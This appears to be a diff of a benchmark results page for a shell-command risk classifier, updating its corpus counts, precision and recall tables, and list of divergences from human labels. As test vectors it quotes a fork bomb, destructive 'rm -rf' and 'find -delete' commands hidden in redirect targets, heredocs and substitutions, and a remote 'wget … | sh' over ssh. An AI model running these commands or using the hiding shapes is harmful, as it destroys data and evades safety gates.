@@ -46,8 +46,11 @@ from `apps/sidecar/src/normalize.ts` — with no mocks.
   the strict leak gate over the rest of the tree stays hole-free.
 
 Corpus size: **38 redaction positives** across **29 kind families**, **28 hard negatives**, and
-**67 classifier command vectors** (including shell-escape, multi-call binary, Git global-option,
-Git shell-alias, dynamic-executable, and redirect-placement adversarial forms).
+**80 classifier command vectors** (including shell-escape, multi-call binary, Git global-option,
+Git shell-alias, dynamic-executable, redirect-placement adversarial forms, and one shape from each
+classifier audit round since the sixth — remote-runner substitution, heredoc bodies, compound
+statements, quoted assignments, ANSI-C and `$$` quoting, unterminated heredocs, command-word
+substitutions).
 
 ## Results — redaction
 
@@ -143,7 +146,7 @@ metric RED.
 ## Results — risk classifier
 
 Measured against `classifyCommandWithCategories` (`apps/sidecar/src/normalize.ts`).
-Classifier results below were regenerated on 2026-08-14.
+Classifier results below were regenerated on 2026-08-26.
 
 **Scope.** This benchmarks the **command-pattern** categories the classifier derives from the
 command string: `recursive-rm`, `disk-destroy`, `history-rewrite`, `db-drop`, `fork-bomb`,
@@ -153,16 +156,16 @@ the tool input (not from the command string alone) and are **out of scope** for 
 
 | Category          | Support | Precision | Recall     |
 | ----------------- | ------- | --------- | ---------- |
-| recursive-rm      | 17      | 100.0%    | 100.0%     |
+| recursive-rm      | 25      | 100.0%    | 100.0%     |
 | disk-destroy      | 4       | 80.0%     | 100.0%     |
 | history-rewrite   | 8       | 100.0%    | 100.0%     |
 | db-drop           | 3       | 75.0%     | 100.0%     |
 | fork-bomb         | 1       | 100.0%    | 100.0%     |
 | perm-change       | 5       | 100.0%    | 100.0%     |
-| inline-code       | 9       | 100.0%    | 100.0%     |
+| inline-code       | 13      | 100.0%    | 100.0%     |
 | migrate-prod      | 2       | 50.0%     | 100.0%     |
-| high-risk-other   | 1       | 14.3%     | 100.0%     |
-| **micro-average** | 50      | **83.3%** | **100.0%** |
+| high-risk-other   | 1       | 11.1%     | 100.0%     |
+| **micro-average** | 62      | **83.8%** | **100.0%** |
 
 **Recall is 100% on every category** — nothing dangerous in the corpus slips past the classifier.
 Read that as a statement about _this corpus_, not a general guarantee: the corpus is only as good as
@@ -178,8 +181,13 @@ once more, by one label on `` cp report.txt >`rm -rf …` ``: backtick substitut
 through the same word reader as `$(…)`, so a redirect target that is nothing but a substitution
 draws the same "could not analyse this segment" label that the `$(…)` spelling already drew. That
 is the two spellings agreeing rather than a new class — the vector keeps its `recursive-rm` and
-`inline-code` labels and was gated before and after. Precision is otherwise below 100% only where a keyword literal
-fires on a benign near-miss (below). This is
+`inline-code` labels and was gated before and after. The eleventh round added thirteen audit
+shapes to the corpus; two of them (an unquoted heredoc body that expands `$(…)`, and an empty
+substitution standing where the program name goes) draw the same marker for the same reason, which
+is why `high-risk-other` precision reads 11.1% — every one of its false positives sits next to a
+correct label. Micro-average precision moved _up_ slightly because the new vectors mostly carry
+exact labels. Precision is otherwise below 100% only where a keyword literal fires on a benign
+near-miss (below). This is
 the deliberate design bias: **under-detection (a real destructive op sneaking through) is far worse
 than over-gating (an extra approval prompt)**, so ambiguous cases fail toward "gate it."
 
@@ -187,11 +195,11 @@ than over-gating (an extra approval prompt)**, so ambiguous cases fail toward "g
 
 | Policy                              | Precision | Recall | TP / FP / FN / TN |
 | ----------------------------------- | --------- | ------ | ----------------- |
-| default-gated (out-of-box)          | 95.1%     | 100.0% | 39 / 2 / 0 / 26   |
-| strict-all (every category enabled) | 92.0%     | 100.0% | 46 / 4 / 0 / 17   |
+| default-gated (out-of-box)          | 96.0%     | 100.0% | 48 / 2 / 0 / 30   |
+| strict-all (every category enabled) | 93.2%     | 100.0% | 55 / 4 / 0 / 21   |
 
-- Risk-level exact-match accuracy: **91.0%**.
-- Danger recall (vectors labelled non-`low` that the classifier flags non-`low`): **97.8%**.
+- Risk-level exact-match accuracy: **91.3%**.
+- Danger recall (vectors labelled non-`low` that the classifier flags non-`low`): **98.2%**.
 
 Under the out-of-box `DEFAULT_GATED_CATEGORIES`, `inline-code` is **on by default** alongside the
 catastrophic categories: interpreter-mediated operations are held even when the classifier cannot
@@ -201,24 +209,26 @@ their noisier keyword matches therefore do not affect default-gated precision.
 ### Divergences from human labels (findings / calibration notes)
 
 The harness prints every divergence, and this table lists every one of them (an earlier revision
-listed four of ten; the six `high-risk-other` rows were missing). All false positives are
-**safe-direction over-gates**. Four come from whole-command keyword literals; six are the
+listed four of ten; the `high-risk-other` rows were missing). All false positives are
+**safe-direction over-gates**. Four come from whole-command keyword literals; eight are the
 `high-risk-other` marker — the classifier's "this segment could not be analysed" floor — riding
-alongside a named category that _is_ correct, which is why that category's precision (14.3%) is the
+alongside a named category that _is_ correct, which is why that category's precision (11.1%) is the
 lowest in the table above. No divergence loses a label or lowers a verdict below the human one.
 
-| Command                                        | Divergence                                                     | Nature                                                                                                                                                                                           |
-| ---------------------------------------------- | -------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
-| `dd if=backup.iso of=restore.iso bs=4M`        | predicted `disk-destroy`                                       | `dd if=` literal fires even for a file-to-file copy (no block device). Intentional safe-side over-gate.                                                                                          |
-| `grep -rn 'DROP TABLE' migrations/`            | predicted `db-drop`                                            | The literal `DROP TABLE` string appears in a _search_ argument. Keyword match, not intent.                                                                                                       |
-| `echo 'see the production runbook'`            | predicted `migrate-prod`                                       | `production` keyword in prose. Off by default.                                                                                                                                                   |
-| `cat docs/migrate-guide.md`                    | predicted `migrate-prod`                                       | `migrate` keyword in a filename. Off by default.                                                                                                                                                 |
-| `:(){ :\|:& };:`                               | extra `high-risk-other` (label: `fork-bomb`)                   | The function-definition syntax splits into segments (`:(){ :`, `}`) that have no readable program name; each draws the unanalyzable-segment marker. `fork-bomb` is still detected.               |
-| `cp report.txt >$(find /var/tmp -delete)`      | extra `high-risk-other` (label: `recursive-rm`, `inline-code`) | The executable redirect target is carried into classification as its own segment whose only token is the raw `$(…)`; that segment draws the marker while its body yields the correct categories. |
-| `cp report.txt >"$(find /var/tmp -delete)"`    | extra `high-risk-other` (same labels)                          | Same mechanism, quoted target.                                                                                                                                                                   |
-| `` cp report.txt >`rm -rf /tmp/build-cache` `` | extra `high-risk-other` (same labels)                          | Same mechanism, backtick form.                                                                                                                                                                   |
-| `echo note\># ; rm -rf /tmp/build-cache`       | extra `high-risk-other` (label: `recursive-rm`)                | The escaped `\>` stays in the `echo` segment's token; the fail-safe marker fires on that segment. `rm -rf` is classified normally — this vector pins the phantom-comment fix (SEC-R6-1).         |
-| `cp report.txt >$(date +%F).log`               | extra `high-risk-other` (label: `inline-code`)                 | Same elided-target mechanism with a harmless body: `inline-code` is the correct label, the marker is the cost of carrying the target into analysis at all.                                       |
+| Command                                        | Divergence                                                     | Nature                                                                                                                                                                                             |
+| ---------------------------------------------- | -------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `dd if=backup.iso of=restore.iso bs=4M`        | predicted `disk-destroy`                                       | `dd if=` literal fires even for a file-to-file copy (no block device). Intentional safe-side over-gate.                                                                                            |
+| `grep -rn 'DROP TABLE' migrations/`            | predicted `db-drop`                                            | The literal `DROP TABLE` string appears in a _search_ argument. Keyword match, not intent.                                                                                                         |
+| `echo 'see the production runbook'`            | predicted `migrate-prod`                                       | `production` keyword in prose. Off by default.                                                                                                                                                     |
+| `cat docs/migrate-guide.md`                    | predicted `migrate-prod`                                       | `migrate` keyword in a filename. Off by default.                                                                                                                                                   |
+| `:(){ :\|:& };:`                               | extra `high-risk-other` (label: `fork-bomb`)                   | The function-definition syntax splits into segments (`:(){ :`, `}`) that have no readable program name; each draws the unanalyzable-segment marker. `fork-bomb` is still detected.                 |
+| `cp report.txt >$(find /var/tmp -delete)`      | extra `high-risk-other` (label: `recursive-rm`, `inline-code`) | The executable redirect target is carried into classification as its own segment whose only token is the raw `$(…)`; that segment draws the marker while its body yields the correct categories.   |
+| `cp report.txt >"$(find /var/tmp -delete)"`    | extra `high-risk-other` (same labels)                          | Same mechanism, quoted target.                                                                                                                                                                     |
+| `` cp report.txt >`rm -rf /tmp/build-cache` `` | extra `high-risk-other` (same labels)                          | Same mechanism, backtick form.                                                                                                                                                                     |
+| `echo note\># ; rm -rf /tmp/build-cache`       | extra `high-risk-other` (label: `recursive-rm`)                | The escaped `\>` stays in the `echo` segment's token; the fail-safe marker fires on that segment. `rm -rf` is classified normally — this vector pins the phantom-comment fix (SEC-R6-1).           |
+| `cp report.txt >$(date +%F).log`               | extra `high-risk-other` (label: `inline-code`)                 | Same elided-target mechanism with a harmless body: `inline-code` is the correct label, the marker is the cost of carrying the target into analysis at all.                                         |
+| `cat <<EOF` … `don't $(find …) isn't` … `EOF`  | extra `high-risk-other` (label: `recursive-rm`, `inline-code`) | An unquoted heredoc body expands `$(…)`; the expanded substitution is surfaced as its own segment whose only token is the raw substitution, and that segment draws the marker (audit R10 H2).      |
+| ` ` rm -rf /srv ``                             | extra `high-risk-other` (label: `recursive-rm`, `inline-code`) | An empty substitution in the command-word position cannot name a program statically; the flattened form supplies `recursive-rm`, the unanalyzable word supplies the marker (audit R11 SEC-CQ11-1). |
 
 Risk-level calibration notes:
 
@@ -233,6 +243,10 @@ Risk-level calibration notes:
   that slips, which is the wrong way round. Tracked for correction rather than left implicit.
 - `find … -exec rm {} ;` classifies as `medium` rather than `high`; it is still gated
   (`recursive-rm`).
+- `ssh host 'wget -qO- https://x.example/y | sh'` classifies as `medium` (`inline-code`) where the
+  human label says `high`: the quoted script is classified as inner code and gates because that
+  inner code pipes a download into `sh`, but the classifier does not escalate a remote pipe-to-shell
+  above the inline-code floor. It is carded in both modes; the divergence is the severity word.
 
 ## External corpus cross-evaluation (gitleaks)
 
